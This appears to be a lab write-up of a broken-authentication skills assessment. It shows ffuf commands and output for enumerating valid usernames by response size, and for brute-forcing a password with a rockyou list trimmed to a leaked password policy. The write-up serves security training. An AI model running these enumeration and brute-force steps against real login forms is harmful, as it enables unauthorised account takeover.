# Skills Assessment — Broken Authentication (full write-up)

---

## Recon

Plain website, nothing interesting to click. The single real entry point is a **login form** (username + password).

![Website landing page](Images/website-intro.png)

There is no creds, no extra pages → the only door is the login, so I attack it. First question I ask is which usernames are valid, and can we have a way to enumerate the users (i.e error message different is user is valid?) 

---

## Step 1 — User Enumeration

The invalid-user response is a constant size, so I fuzz a username wordlist and filter that size out (`-fs 4353`). Whatever survives the filter can be a real account, I will be able to check on the UI.

```bash
ffuf -w seclists/Usernames/xato-net-10-million-usernames.txt \
  -u http://X.X.X.X:PORT/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" -fs 4353
```

```
 :: Method           : POST
 :: URL              : http://X.X.X.X:PORT/login.php
 :: Data             : username=FUZZ&password=invalid
 :: Filter           : Response size: 4353
________________________________________________

username_valid                  [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 29ms]
username_valid                  [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 892ms]
```

The valid vs invalid usernames produce different error messages, which is what is leaking the account:

![Different error message reveals a valid user](Images/user-enumerated-error-message.png)

**=> Valid user: `username_valid`**

---

## Step 2 — Brute-Forcing username_valid' Password

First attempt with raw `rockyou` (filtering the valid-user size 4344) — no hit after minutes, it might not be the right way to do it:

```bash
ffuf -w rockyou.txt -u http://X.X.X.X:PORT/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=username_valid&password=FUZZ" -fs 4344
```

There is a way to register an account, I can explore to see if they give relevant information. 
That the case, indeed, because when I registered a account, the form leaked a **password policy** (12 chars, upper + lower + digit). So I carve rockyou down to only policy-valid candidates.

![Password policy shown on registration](Images/password-policy.png)


I then registered the account with a valid password a explore what I can do from it : My account lands on `/profile.php` with a "no admin access" message → `profile.php` is the protected home. There is nothing interesting except this information, I can't do anything from my created account. 

![Greg account on profile.php — no admin privileges](Images/login-greg-account.png)

I decided to continue with username_valid account I found, and try to adapt rockyou to the password policy: 


```bash
# keep only 12-char passwords with a digit, a lowercase and an uppercase
grep -E '^[A-Za-z0-9]{12}$' rockyou.txt | grep '[0-9]' | grep '[a-z]' | grep '[A-Z]' > custom_list.txt

ffuf -w custom_list.txt -u http://X.X.X.X:PORT/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=username_valid&password=FUZZ" -fr "Invalid credentials."
```

```
 :: Data             : username=username_valid&password=FUZZ
 :: Filter           : Regexp: Invalid credentials.
________________________________________________

password_valid            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 34ms]
```

I used the the text filter `Invalid credentials., but I could have used the size filter also.

![Invalid credentials message on the login form](Images/invalid-creds.png)

> Thinking: 302 + empty body = login accepted. Matching the wordlist to the policy is what made this feasible.

**=> Creds: `username_valid : password_valid`** → the app now shows a **2FA / OTP** prompt.

